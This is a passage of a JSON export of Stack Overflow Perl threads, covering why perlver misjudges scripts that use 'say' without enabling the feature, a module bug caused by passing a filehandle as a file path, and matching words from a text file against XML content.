{"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1494715545, "post_id": 43956440, "comment_id": 74948369, "body": "@simbabque, names can&#39;t be added to existing namespaces without causing problems, such as breaking a script that has a sub named <code>say</code>. That&#39;s why new ops are only added to CORE:: by default."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494715706, "post_id": 43956440, "comment_id": 74948409, "body": "@Deanie, By the way, even if you program requires a specific version of Perl, it doesn&#39;t make it safe to add <code>use v5.xx;</code> as that actually changes things. otoh, <code>require v5.xx;</code> is safe, or make sure to retest everything after adding <code>use v5.xx;</code>."}], "answers": [{"comments": [{"owner": {"reputation": 2157, "user_id": 3865653, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Fv3Fj.jpg?s=128&g=1", "display_name": "Deanie", "link": "https://stackoverflow.com/users/3865653/deanie"}, "edited": false, "score": 0, "creation_date": 1494699825, "post_id": 43956544, "comment_id": 74944084, "body": "This isn&#39;t true at all.  I can take the above code and change <code>say &quot;Hey&quot;;</code> to <code>print &quot;Hey\\n&quot;;</code> and it runs as expected.  Can you explain your answer?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 2157, "user_id": 3865653, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Fv3Fj.jpg?s=128&g=1", "display_name": "Deanie", "link": "https://stackoverflow.com/users/3865653/deanie"}, "edited": false, "score": 2, "creation_date": 1494699960, "post_id": 43956544, "comment_id": 74944112, "body": "@Deanie, So what? That doesn&#39;t affect my answer at all. Your program isn&#39;t valid in any version of Perl, and <code>print &quot;Hey\\n&quot;;</code> doesn&#39;t prove otherwise!"}, {"owner": {"reputation": 2157, "user_id": 3865653, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Fv3Fj.jpg?s=128&g=1", "display_name": "Deanie", "link": "https://stackoverflow.com/users/3865653/deanie"}, "edited": false, "score": 1, "creation_date": 1494700241, "post_id": 43956544, "comment_id": 74944211, "body": "<code>say</code> is just <code>print</code> that adds a <code>\\n</code> to the end of the statement.  <code>say</code> is included in <code>v5.10</code>, which means the program can run with <code>v5.10</code>.  So <code>say</code> does exist.  And I&#39;m using Perl <code>v5.24</code> which should have access to <code>say</code>.  So why does <code>perlver</code> suggest the minimum version is <code>v5.8.0</code>?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 2157, "user_id": 3865653, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Fv3Fj.jpg?s=128&g=1", "display_name": "Deanie", "link": "https://stackoverflow.com/users/3865653/deanie"}, "edited": false, "score": 2, "creation_date": 1494701185, "post_id": 43956544, "comment_id": 74944521, "body": "@Deanie <code>say</code> is not <i>included</i> in 5.10, it&#39;s available as an optional feature from 5.10. It&#39;s not there automatically.  You need to turn it on."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 4, "creation_date": 1494701217, "post_id": 43956544, "comment_id": 74944535, "body": "No, it&#39;s not included in 5.10. <code>say &quot;Hey&quot;;</code> is just as must a syntax error in 5.10 (and 5.24 as shown in my answer) as it is in 5.8. If you had <code>use feature qw( say ); say &quot;Hey&quot;;</code>, it would be another story."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 4, "last_activity_date": 1494715910, "last_edit_date": 1494715910, "creation_date": 1494699651, "answer_id": 43956544, "question_id": 43956440, "link": "https://stackoverflow.com/questions/43956440/is-there-a-more-accurate-way-of-determining-the-minimum-version-needed/43956544#43956544", "title": "Is there a more accurate way of determining the minimum version needed?", "body": "<p>Your program isn't valid in any version of Perl.</p>\n\n<pre><code>$ perl5.24.0 -e'use utf8; use strict; use autodie; use warnings; say \"Hey\"; exit 0;'\nString found where operator expected at -e line 1, near \"say \"Hey\"\"\n        (Do you need to predeclare say?)\nsyntax error at -e line 1, near \"say \"Hey\"\"\nExecution of -e aborted due to compilation errors.\n</code></pre>\n\n<p>You might as well have used <code>foo \"Hey\";</code>.</p>\n\n<pre><code>$ perl5.24.0 -e'use utf8; use strict; use autodie; use warnings; foo \"Hey\"; exit 0;'\nString found where operator expected at -e line 1, near \"foo \"Hey\"\"\n        (Do you need to predeclare foo?)\nsyntax error at -e line 1, near \"foo \"Hey\"\"\nExecution of -e aborted due to compilation errors.\n</code></pre>\n\n<p>Start by writing a program that works.</p>\n\n<hr>\n\n<p>On the other hand, let's say your program included the following:</p>\n\n<pre><code>use feature qw( say );\nsay \"Hey\";\n</code></pre>\n\n<p>This particular program requires 5.10, and <code>perlver</code> correctly identifies that 5.10 is required.</p>\n\n<pre><code>   ------------------------------------\n | file | explicit | syntax  | external |\n | ------------------------------------ |\n | a.pl | ~        | v5.10.0 | n/a      |\n | ------------------------------------ |\n | Minimum explicit version : ~                             |\n | Minimum syntax version   : v5.10.0                       |\n | Minimum version of perl  : v5.10.0                       |\n   ------------------------------------\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 2157, "user_id": 3865653, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Fv3Fj.jpg?s=128&g=1", "display_name": "Deanie", "link": "https://stackoverflow.com/users/3865653/deanie"}, "edited": false, "score": 1, "creation_date": 1494716930, "post_id": 43957307, "comment_id": 74948626, "body": "So then when they say that <code>say</code> is included in <code>Perl v5.10</code>, they really mean it&#39;s available, but not included?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 2157, "user_id": 3865653, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Fv3Fj.jpg?s=128&g=1", "display_name": "Deanie", "link": "https://stackoverflow.com/users/3865653/deanie"}, "edited": false, "score": 0, "creation_date": 1494717183, "post_id": 43957307, "comment_id": 74948675, "body": "@Deanie: I think you&#39;ve been misled by the comments. It&#39;s included in the sense that it&#39;s part of the Perl interpreter, but it must be enabled by a <code>use feature</code> statement in your program before you can use it. In a very similar way to strictures being part of Perl, but you must <code>use strict</code> to enable them. It&#39;s up to you whether you think &quot;included&quot; is an appropriate description."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 2157, "user_id": 3865653, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Fv3Fj.jpg?s=128&g=1", "display_name": "Deanie", "link": "https://stackoverflow.com/users/3865653/deanie"}, "edited": false, "score": 0, "creation_date": 1494783979, "post_id": 43957307, "comment_id": 74964029, "body": "@Deanie, They mean you can make it available using <code>use feature qw( say );</code> or similar. They also mean it&#39;s available as <code>CORE::say</code> (since 5.12)."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 5, "last_activity_date": 1494716090, "last_edit_date": 1494716090, "creation_date": 1494704408, "answer_id": 43957307, "question_id": 43956440, "link": "https://stackoverflow.com/questions/43956440/is-there-a-more-accurate-way-of-determining-the-minimum-version-needed/43957307#43957307", "title": "Is there a more accurate way of determining the minimum version needed?", "body": "<p>What is probably confusing you is that, for instance, <code>use 5.010</code> (or <code>use v5.10</code>) does two things</p>\n\n<ul>\n<li><p>It ensures that the version of the current Perl interpreter is at least 5.10. That's what <code>require 5.010</code> does</p></li>\n<li><p>It does the equivalent of <code>use feature ':5.10'</code>, which enables all features available in that version</p></li>\n</ul>\n\n<p>That means if you add <code>use 5.010</code> to your program it will enable, amongst other things, the <code>say</code> feature</p>\n\n<p>But without either <code>use feature 'say'</code> or <code>use 5.010</code> your program won't even compile, so <code>perlver</code> will give you the wrong answer</p>\n\n<p>I recommend using <code>require 5.010</code> and <code>use feature 'say'</code> separately so as to prevent all of the features being enabled whether you want to use them or not, and so polluting your namespace</p>\n"}], "owner": {"reputation": 2157, "user_id": 3865653, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Fv3Fj.jpg?s=128&g=1", "display_name": "Deanie", "link": "https://stackoverflow.com/users/3865653/deanie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 107, "favorite_count": 1, "answer_count": 2, "score": 0, "last_activity_date": 1521222529, "creation_date": 1494699203, "last_edit_date": 1521222529, "question_id": 43956440, "link": "https://stackoverflow.com/questions/43956440/is-there-a-more-accurate-way-of-determining-the-minimum-version-needed", "title": "Is there a more accurate way of determining the minimum version needed?", "body": "\n\n<p>I'm trying to learn Perl.  I write a script and then try to find out what the minimum version of Perl that's needed to run the script.</p>\n\n<p>I was told Perl comes with a program called <a href=\"https://metacpan.org/pod/Perl::MinimumVersion\" rel=\"nofollow noreferrer\"><code>perlver</code></a> which will determine the minimum version needed based on both syntax and by what's explicitly stated.</p>\n\n<p>I have the following code:</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>#!/usr/bin/perl\n\nuse utf8;\nuse strict;\nuse autodie;\nuse warnings;\nuse diagnostics;\n\nsay \"Hey\";\nexit 0;\n</code></pre>\n\n<p>But when I run the script through <a href=\"https://metacpan.org/pod/Perl::MinimumVersion\" rel=\"nofollow noreferrer\"><code>perlver</code></a>, I get the following output:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>[me@here PERL] $ perlver ex6-1 \n\n\n   ------------------------------------  \n | file  | explicit | syntax | external |\n | ------------------------------------ |\n | ex6-1 | ~        | v5.8.0 | n/a      |\n | ------------------------------------ |\n | Minimum explicit version : ~         |\n | Minimum syntax version   : v5.8.0    |\n | Minimum version of perl  : v5.8.0    |\n   ------------------------------------  \n\n[me@here PERL] $\n</code></pre>\n\n<p>It says that the minimum version based on sytax is <code>v5.8.0</code>.  But when I add <code>use v5.8.0</code> to the script, I get an error:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>String found where operator expected at ./ex6-1 line 16, near \"say \"Hey\"\" (#1)\n    (S syntax) The Perl lexer knows whether to expect a term or an operator.\n    If it sees what it knows to be a term when it was expecting to see an\n    operator, it gives you this warning.  Usually it indicates that an\n    operator or delimiter was omitted, such as a semicolon.\n\n    (Do you need to predeclare say?) (#2)\n    (S syntax) This is an educated guess made in conjunction with the message\n    \"%s found where operator expected\".  It often means a subroutine or module\n    name is being referenced that hasn't been declared yet.  This may be\n    because of ordering problems in your file, or because of a missing\n    \"sub\", \"package\", \"require\", or \"use\" statement.  If you're referencing\n    something that isn't defined yet, you don't actually have to define the\n    subroutine or package before the current location.  You can use an empty\n    \"sub foo;\" or \"package FOO;\" to enter a \"forward\" declaration.\n\nsyntax error at ./ex6-1 line 16, near \"say \"Hey\"\"\nExecution of ./ex6-1 aborted due to compilation errors (#3)\n    (F) Probably means you had a syntax error.  Common reasons include:\n\n        A keyword is misspelled.\n        A semicolon is missing.\n        A comma is missing.\n        An opening or closing parenthesis is missing.\n        An opening or closing brace is missing.\n        A closing quote is missing.\n\n    Often there will be another error message associated with the syntax\n    error giving more information.  (Sometimes it helps to turn on -w.)\n    The error message itself often tells you where it was in the line when\n    it decided to give up.  Sometimes the actual error is several tokens\n    before this, because Perl is good at understanding random input.\n    Occasionally the line number may be misleading, and once in a blue moon\n    the only way to figure out what's triggering the error is to call\n    perl -c repeatedly, chopping away half the program each time to see\n    if the error went away.  Sort of the cybernetic version of 20 questions.\n\nUncaught exception from user code:\n    syntax error at ./ex6-1 line 16, near \"say \"Hey\"\"\n    Execution of ./ex6-1 aborted due to compilation errors.\n</code></pre>\n\n<p>The error suggests that <code>say</code> isn't included in the <code>v5.8.0</code>.  So how can I accurately find out the minimum required version of Perl needed to run a script?</p>\n\n<p>Or might there be a complete list of Perl functions listed by verison number that I can parse myself to get the minimum version?</p>\n"}, {"tags": ["perl", "module"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1494675968, "post_id": 43952691, "comment_id": 74936853, "body": "Are you sure that&#39;s because of the <code>use</code> statement? It sounds more like that&#39;s an error from opening a file. Your <code>use lib</code> looks fine. Have you tried using backslashes <code>\\</code> instead of forward slashes <code>&#47;</code>? You need to escape them with extra backslashes, so it&#39;s <code>\\\\</code> in double quotes<code>&quot;&quot;</code>."}, {"owner": {"reputation": 3, "user_id": 7896796, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ded963edd930c751533beaa332f192a0?s=128&d=identicon&r=PG&f=1", "display_name": "E.L", "link": "https://stackoverflow.com/users/7896796/e-l"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1494678120, "post_id": 43952691, "comment_id": 74937536, "body": "You were right it was a error with the file itself and the use lib command aktually worked! Thank&#39;s!"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494678297, "post_id": 43952691, "comment_id": 74937570, "body": "Good. I&#39;m voting to close because of a typo."}, {"owner": {"reputation": 3, "user_id": 7896796, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ded963edd930c751533beaa332f192a0?s=128&d=identicon&r=PG&f=1", "display_name": "E.L", "link": "https://stackoverflow.com/users/7896796/e-l"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494678793, "post_id": 43952691, "comment_id": 74937704, "body": "maybe it was a typo but when I just removed one of the filehandles it worked. Therfore I guess the error was due to opening it twice"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494678930, "post_id": 43952691, "comment_id": 74937737, "body": "Ah. No. You opened the file and then passed the file handle to the function, where you used it as a file name. The handle got serialized, turning it into a weird string. Try printing the file handle to see what I mean. Obviously that file then doesn&#39;t exist. So it&#39;s not the typo close reason. I&#39;ll remove the vote and wrote up an answer with a more detailed explanation."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494699129, "post_id": 43952691, "comment_id": 74943900, "body": "In the future, please provide the output you actually received!"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494680908, "post_id": 43953463, "comment_id": 74938361, "body": "@E.L: As <b>simbabque</b> says, your <i>real</i> error message would be something like <code>Can&#39;t open file GLOB(0x26ba8c): No such file or directory</code> but that&#39;s not what you told us. If you ask for help then for goodness sake don&#39;t remove bits of information that you&#39;ve decided are irrelevant. You&#39;ve posted a question because you can find the cause of the problem, so you&#39;re not really in a position to determine what evidence is relevant and what isn&#39;t."}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 0, "last_activity_date": 1494680544, "creation_date": 1494680544, "answer_id": 43953463, "question_id": 43952691, "link": "https://stackoverflow.com/questions/43952691/module-location-of-self-written-perl-module/43953463#43953463", "title": "Module location of self-written Perl module", "body": "<p>The error message comes from the <code>open</code> inside of your function. In your script, you open a filehandle called <code>$FH_DNA_in</code> and you then pass that filehandle variable to your function</p>\n\n<pre><code>#        V\nopen (my $FH_DNA_in, \"&lt;\", $DNAinput) or die \" Can't open file $DNAinput: $!\\n\";\n#                              V\nprint (Bioinformatics::Pattern($FH_DNA_in), \"\\n\"); #  applying module function\n</code></pre>\n\n<p>In the function, you use it as the path to the file to open.</p>\n\n<pre><code>sub Pattern {\n    my $count = \"0\";\n    my ($DNAinput) = @_; # first arg was the filehandle!\n\n    #                           | this is the old filehandle\n    #        V different var    V\n    open (my $FH_DNA_in, \"&lt;\", $DNAinput) or die \" Can't open file $DNAinput: $!\\n\";\n</code></pre>\n\n<p>The <code>$FH_DNA_in</code> in that function is a new lexical variable. It has nothing to do with the old filehandle, which ended up in <code>$DNAinput</code>, because that is what you passed as the first (and only) argument.</p>\n\n<p>If you use the filehandle where a path is expected, Perl will serialize it. That looks something like this:</p>\n\n<pre><code>$ perl -E \"open my $fh, '&gt;', 'tmp'; say $fh;\"\nGLOB(0x26ba8c)\n</code></pre>\n\n<p>So it tries to look for a file with that name, which of course doesn't exist.</p>\n\n<p>You should have seen a full error message that looked like this:</p>\n\n<blockquote>\n  <p>Can't open file GLOB(0x26ba8c): No such file or directory</p>\n</blockquote>\n\n<p>Note that it doesn't tell you in which line the error occurred because you included a newline <code>\\n</code> in the argument to <code>die</code>. If you had not done that it would have been more obvious that loading the module worked because the message would have been more along the lines of</p>\n\n<blockquote>\n  <p>Can't open file GLOB(0x26ba8c): No such file or directory at C:/Users/XPS13/Documents/Uni/UEProgramming/Bioinformatics.pm line 9.</p>\n</blockquote>\n"}], "owner": {"reputation": 3, "user_id": 7896796, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ded963edd930c751533beaa332f192a0?s=128&d=identicon&r=PG&f=1", "display_name": "E.L", "link": "https://stackoverflow.com/users/7896796/e-l"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 50, "favorite_count": 0, "answer_count": 1, "score": -4, "last_activity_date": 1494680544, "creation_date": 1494675484, "last_edit_date": 1494680489, "question_id": 43952691, "link": "https://stackoverflow.com/questions/43952691/module-location-of-self-written-perl-module", "title": "Module location of self-written Perl module", "body": "<p>I am trying to use my module in a script.</p>\n\n<p>I know that you have to provide a module location and would like to provide the path in the script. However, I get the error message:</p>\n\n<blockquote>\n  <p>No such file or directory </p>\n</blockquote>\n\n<p>This is my script: </p>\n\n<pre><code>use strict;\nuse warnings;\nuse lib \"C:/Users/XPS13/Documents/Uni/UEProgramming\";\n\nuse Bioinformatics;\n\nmy $DNAinput = \"restriction_test.txt\";\n\nopen (my $FH_DNA_in, \"&lt;\", $DNAinput) or die \" Can't open file $DNAinput: $!\\n\";\n\nprint \"Pattern match for input file \\n\";\nprint (Bioinformatics::Pattern($FH_DNA_in), \"\\n\"); #  applying module function  \n</code></pre>\n\n<p>And this is my module </p>\n\n<pre><code>package Bioinformatics; # making module, 1st line contains name\n\nuse strict; # module uses strict and warnings \nuse warnings;\n\nsub Pattern {\nmy $count = \"0\";\nmy ($DNAinput) = @_;\nopen (my $FH_DNA_in, \"&lt;\", $DNAinput) or die \" Can't open file $DNAinput: $!\\n\";\n    while (my $line = &lt;$FH_DNA_in&gt;) {\n        if ($line =~ /[AG]GATC[TC]/ ) { \n        ++ $count;\n        }\n}\n    print \"Your sequence contains the pattern [AG]GATC[TC] $count times\\n\";\n}\n\n    1; # last line \n</code></pre>\n\n<h3>Answer:</h3>\n\n<p>The module location works.</p>\n\n<p>The error occured because I opened the file twice (in the script and the module)</p>\n\n<p>When opening it only within the module, it works. The updated script is: </p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse lib \"C:/Users/XPS13/Documents/Uni/UEProgramming\";\n\nuse Bioinformatics;\n\nmy $DNAinput = \"restriction_test.txt\";\n\nprint \"Pattern match for input file \\n\";\nprint (Bioinformatics::Pattern($DNAinput), \"\\n\"); #  applying module function  \n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1494672776, "post_id": 43951986, "comment_id": 74935924, "body": "<code>if $words = @hashlist[$_]</code> is a bug.  What are you trying to do there?"}, {"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1494673180, "post_id": 43951986, "comment_id": 74936055, "body": "Why do you do <code>$h = $h-&gt;{$_}</code> ?"}, {"owner": {"reputation": 41, "user_id": 7918059, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/d5181cf8c32823af74542be6f61d87cb?s=128&d=identicon&r=PG&f=1", "display_name": "nicha", "link": "https://stackoverflow.com/users/7918059/nicha"}, "reply_to_user": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1494686120, "post_id": 43951986, "comment_id": 74939933, "body": "I want to check if words in xml file exist in hashlist"}, {"owner": {"reputation": 41, "user_id": 7918059, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/d5181cf8c32823af74542be6f61d87cb?s=128&d=identicon&r=PG&f=1", "display_name": "nicha", "link": "https://stackoverflow.com/users/7918059/nicha"}, "reply_to_user": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1494686200, "post_id": 43951986, "comment_id": 74939958, "body": "hashlist here is felled with seq of txt file"}], "answers": [{"tags": [], "owner": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "is_accepted": true, "score": 0, "last_activity_date": 1494767297, "creation_date": 1494767297, "answer_id": 43964249, "question_id": 43951986, "link": "https://stackoverflow.com/questions/43951986/search-and-add-a-text-file-for-words-in-an-xml-file/43964249#43964249", "title": "Search and add a text file for words in an XML file", "body": "<p>I have put together a quick script to indicate how one might go about this.</p>\n\n<p>I have not bothered with xml, because that may well have left me in a bad mood.</p>\n\n<p>My advice would be: do use variables, whatever you save from not doing so is lost as your code gets confusing and then buggy.</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\n# Notes:\n\n# - more than one space or tab in a row are mangled: They become one space only\n# - the query file is not checked for containing actual words to match on,\n#   it is assumed to be suitable\n# - I have made no attempt to parse xml. You should use a parser for that.\n#   Search Stack Overflow or Google or CPAN or all of those for examples.\n# - The replace_xml_text function can be used on the text supplied by the\n#   parser to get the desired output\n# - a feeble attempt is made to deal with punctuation in replace_xml_text\n# - This code is not really tested\n\nmy %query_words;\n\nmy $query_fn = 'query.txt';\nopen (my $fh, \"&lt;\",$query_fn) or die \"could not open file '$query_fn'\"; \n\n# build list of words from query file\n\nwhile ( &lt;$fh&gt; ){\n    chomp;\n\n    # Words mentioned in line.\n    my @words = split(/\\s+/,$_);\n\n    # Words joined by 'x'. Seems a strange choice *shrug*.\n    # This is used to replace words with later.\n    my $line  = join(\"x\",@words);\n\n    # Storing in arrayref, this seems easier to me \n    # than concatening repeatedly and getting the spaces right.\n    for my $word ( @words ){\n        push @{$query_words{$word}}, $line;\n    }\n}\n\n\n\n# Expects the text to replace.\n# Returns the text to replace it with.\n\nsub replace_xml_text {\n    my $original_text = shift;\n\n    my @words;\n\n    for my $word ( split(/\\s+/,$original_text) ){\n\n        my $punctuation = '';\n\n        # Remove punctuation before matching,\n        # but do preserve it.\n        if ( $word =~s /(\\s*[,.]\\s*)$// ){\n            $punctuation = $1;\n        }\n\n        if ( my $additions = $query_words{$word} ){\n            $word = join(\" \",$word,@$additions);\n        }\n\n        # Put punctuation back.\n        $word .= $punctuation;\n\n        # Done replacing in this word, next\n        push @words,$word;\n    }\n\n    return join(\" \",@words);\n}\n</code></pre>\n"}], "owner": {"reputation": 41, "user_id": 7918059, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/d5181cf8c32823af74542be6f61d87cb?s=128&d=identicon&r=PG&f=1", "display_name": "nicha", "link": "https://stackoverflow.com/users/7918059/nicha"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 62, "favorite_count": 0, "accepted_answer_id": 43964249, "answer_count": 1, "score": -1, "last_activity_date": 1494767297, "creation_date": 1494671049, "last_edit_date": 1494686252, "question_id": 43951986, "link": "https://stackoverflow.com/questions/43951986/search-and-add-a-text-file-for-words-in-an-xml-file", "title": "Search and add a text file for words in an XML file", "body": "<p>I have two files. The first has a sequence of words on each line</p>\n\n<pre><code>bus do car\ncar tree\n</code></pre>\n\n<p>The second file is an XML file</p>\n\n<pre><code>&lt;title&gt;i have a car. i take bus..&lt;/title&gt;\n</code></pre>\n\n<p>I want to search the text file for each word in the XML file. If it is found, I want to insert all lines from the text file where it appears, with any spaces replaced by <code>x</code>.</p>\n\n<p>The result file would be</p>\n\n<pre><code>&lt;title&gt;i have a car busxdoxcar carxtree. i take bus busxdoxcar..&lt;/title&gt;\n</code></pre>\n\n<p>I try this </p>\n\n<pre><code>use strict;\nuse warnings;\nuse autodie; \n\nmy $QueryFile = \"query.txt\";\nmy $SequenceFile = \"Seq_2_terms_150.txt\";\nmy %hashlist;\n\nopen NewQueryFile ,\"&gt;./NewQuery.txt\"\n    or die \"Cannot create NewQuery.txt\";\n\nopen(my $fh,$SequenceFile)\n    or die \"$SequenceFile : $!\";\n\nwhile ( &lt;$fh&gt; ) {\n    chop;\n    s/^\\s+|\\s+$//g;\n    my $h = \\%hashlist;\n    foreach ( split('\\s+', $_) ) {\n        $h-&gt;{$_} //= {};        \n        $h = $h-&gt;{$_}; \n    }\n    $h-&gt;{'#'} = 1;\n}\nclose $fh;\n\nopen(my $fd, $QueryFile)\n    or die \"$QueryFile : $!\";\n\nfor my $xml (&lt;$fd&gt;) {  \n    foreach my $line (split(/\\n/, $xml)) {\n        my @words = split(/\\s/, $line);\n        if $words = @hashlist[$_] {\n            print NewQueryFile join ('x',$words) ;\n        }\n    }\n}\n\nclose NewQueryFile ;\n\nclose($fd);\n</code></pre>\n"}, {"tags": ["arrays", "perl"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 3, "creation_date": 1494624503, "post_id": 43946547, "comment_id": 74926304, "body": "I don&#39;t see how it &quot;<i>prints nothing</i>&quot;. Your 